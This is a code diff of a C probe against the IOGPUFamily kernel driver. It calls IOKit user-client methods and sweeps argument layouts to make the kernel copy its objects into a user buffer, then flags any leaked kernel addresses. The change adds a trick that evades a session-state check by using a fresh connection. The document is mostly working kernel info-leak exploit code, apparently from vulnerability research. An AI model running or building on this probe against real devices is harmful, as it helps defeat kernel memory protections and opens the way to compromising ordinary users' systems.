@@ -716,81 +716,112 @@ void nk_iogpu_group_oob_run(int trigger)
 
 
     if (trigger == 7) {
-        /* KERNEL READ-OUT PROBE.
+        /* KERNEL READ-OUT PROBE (cmd 0/128).
          *
          * The cmd 0/128 path in IOGPUFamily (0x9f60050) resolves an object
          * by id and then copies its data to a USER pointer:
          *   0x9f602f4: ldr  x1, [x20, #56]     ; the kernel object
          *   0x9f602f8: ldr  x2, [x19, #112]    ; the SIZE
-         *   0x9f60310: mov  x3, x21
          *   0x9f6031c: bl   0x8474018          ; the copy out
-         * The destination comes from the input struct (struct[56] is the
-         * user pointer, struct[72] must be non-zero, struct[24] is the
-         * args blob which has to be >= 16 bytes).
+         * The destination is the user pointer from the struct, and the size
+         * comes from the kernel.
          *
-         * So: create a group, point the command at a big buffer we own,
-         * fill the buffer with a known pattern, and look at what the
-         * kernel wrote into it. If it writes more than we asked for, or
-         * writes kernel objects, we have a kernel read (and an
-         * out-of-bounds write into our own buffer).
+         * The handler refuses the call when bit 1 of the session state byte
+         * is set (0x9f60098 ldrb w8,[x20,#64] / tbnz w8,#1) - and creating
+         * a group sets that bit. So the read-out has to go out on a FRESH
+         * connection, with the group created on another one.
+         *
+         * The args blob (struct[24], >= 16 bytes) is parsed by the helper
+         * 0xa241cbc; the value it yields is compared against the object's
+         * type field, so the layout of the blob is swept as well.
          */
-        ol("[grp] === KERNEL READ-OUT PROBE (cmd 0/128) ===");
+        ol("[grp] === KERNEL READ-OUT PROBE (cmd 0/128, fresh session) ===");
         static uint8_t userbuf[0x8000];
         static uint8_t argsbuf[0x100];
 
-        int k7 = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, userbuf, &on);
+        /* the group is created on its own connection */
         uint64_t grp7 = 0;
-        if (k7 == 0) memcpy(&grp7, userbuf + 0x10, 8);
-        ol("[grp] group -> kr=0x%x grp=0x%016llx", k7, (unsigned long long)grp7);
+        {
+            uint8_t o[0x200];
+            size_t on = 0;
+            int k = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, o, &on);
+            if (k == 0) memcpy(&grp7, o + 0x10, 8);
+            ol("[grp] group on the other connection -> kr=0x%x grp=0x%016llx",
+               k, (unsigned long long)grp7);
+        }
 
-        /* candidates for the id/type the lookup wants */
+        /* a FRESH connection for the read-out itself */
+        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                        IOServiceMatching("IOGPU"));
+        io_connect_t fresh = MACH_PORT_NULL;
+        for (uint32_t t = 0; t <= 40 && !fresh; t++) {
+            io_connect_t c = MACH_PORT_NULL;
+            if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) fresh = c;
+        }
+        if (!fresh) { ol("[grp] no fresh connection"); return; }
+
         static const uint64_t cands[] = { 0, 1, 2, 3, 64, 128, 256, 512,
                                           0x1000, 0x10000, 0xffffffff };
+        /* where in the args blob the id/type sits, and the value */
+        static const uint32_t aoff[] = { 0, 8, 16 };
+        int hits = 0;
         for (uint32_t ci = 0; ci < sizeof(cands)/sizeof(cands[0]); ci++) {
-            for (uint32_t f72 = 1; f72 <= 2; f72++) {
-                memset(userbuf, 0xAA, sizeof(userbuf));
-                memset(argsbuf, 0, sizeof(argsbuf));
-                uint64_t v = cands[ci];
-                memcpy(argsbuf + 0, &v, 8);
-                memcpy(argsbuf + 8, &v, 8);
-                uintptr_t ap7 = (uintptr_t)argsbuf;
-                uintptr_t bp7 = (uintptr_t)userbuf;
+            for (uint32_t ai = 0; ai < sizeof(aoff)/sizeof(aoff[0]); ai++) {
+                for (uint32_t f72 = 1; f72 <= 2; f72++) {
+                    for (uint32_t usegrp = 0; usegrp <= 1; usegrp++) {
+                        memset(userbuf, 0xAA, sizeof(userbuf));
+                        memset(argsbuf, 0, sizeof(argsbuf));
+                        uint64_t v = cands[ci];
+                        memcpy(argsbuf + aoff[ai], &v, 8);
+                        memcpy(argsbuf + 0, &v, 8);
+                        memcpy(argsbuf + 8, &v, 8);
+                        uintptr_t ap7 = (uintptr_t)argsbuf;
+                        uintptr_t bp7 = (uintptr_t)userbuf;
 
-                uint8_t in7[STRUCT_SZ];
-                memset(in7, 0, sizeof(in7));
-                uint64_t c0 = 0;
-                memcpy(in7 + 0, &c0, 8);
-                memcpy(in7 + 24, &ap7, 8);
-                memcpy(in7 + 56, &bp7, 8);
-                uint64_t fv = f72;
-                memcpy(in7 + 72, &fv, 8);
-                uint64_t gid = grp7;
-                memcpy(in7 + 64, &gid, 8);
+                        uint8_t in7[STRUCT_SZ];
+                        memset(in7, 0, sizeof(in7));
+                        uint64_t c0 = 0;
+                        memcpy(in7 + 0, &c0, 8);
+                        memcpy(in7 + 24, &ap7, 8);
+                        memcpy(in7 + 56, &bp7, 8);
+                        uint64_t fv = f72;
+                        memcpy(in7 + 72, &fv, 8);
+                        uint64_t gv = usegrp ? grp7 : 0;
+                        memcpy(in7 + 64, &gv, 8);
 
-                static uint8_t out7[0x400];
-                size_t on7 = sizeof(out7);
-                memset(out7, 0, on7);
-                kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in7, sizeof(in7), out7, &on7);
-                int touched = 0;
-                for (size_t o = 0; o < sizeof(userbuf); o++) {
-                    if (userbuf[o] != 0xAA) { touched = 1; break; }
-                }
-                ol("[grp] cand=0x%llx f72=%u -> kr=0x%x outN=%zu buffer_touched=%d",
-                   (unsigned long long)cands[ci], f72, kr, on7, touched);
-                if (touched) {
-                    size_t shown = 0;
-                    for (size_t o = 0; o < sizeof(userbuf) && shown < 24; o += 8) {
-                        uint64_t w = 0;
-                        memcpy(&w, userbuf + o, 8);
-                        if (w == 0xAAAAAAAAAAAAAAAAULL) continue;
-                        shown++;
-                        ol("[grp]   buf+0x%04zx = 0x%016llx%s", o, (unsigned long long)w,
-                           grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
+                        static uint8_t out7[0x400];
+                        size_t on7 = sizeof(out7);
+                        memset(out7, 0, on7);
+                        kern_return_t kr = IOConnectCallStructMethod(fresh, IOGPU_SEL,
+                                                                      in7, sizeof(in7),
+                                                                      out7, &on7);
+                        int touched = 0;
+                        for (size_t o = 0; o < sizeof(userbuf); o++)
+                            if (userbuf[o] != 0xAA) { touched = 1; break; }
+                        if (kr != 0xe00002be || touched) {
+                            ol("[grp] cand=0x%llx aoff=%u f72=%u grp=%u -> kr=0x%x touched=%d",
+                               (unsigned long long)cands[ci], aoff[ai], f72, usegrp,
+                               kr, touched);
+                        }
+                        if (touched) {
+                            hits++;
+                            size_t shown = 0;
+                            for (size_t o = 0; o < sizeof(userbuf) && shown < 32; o += 8) {
+                                uint64_t w = 0;
+                                memcpy(&w, userbuf + o, 8);
+                                if (w == 0xAAAAAAAAAAAAAAAAULL) continue;
+                                shown++;
+                                ol("[grp]   buf+0x%04zx = 0x%016llx%s", o,
+                                   (unsigned long long)w,
+                                   grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
+                            }
+                        }
                     }
                 }
             }
         }
-        ol("[grp] read-out probe done");
+        ol("[grp] read-out probe done, buffer hits=%d", hits);
+        IOServiceClose(fresh);
     }
 
     if (trigger == 0 || trigger == 4) {
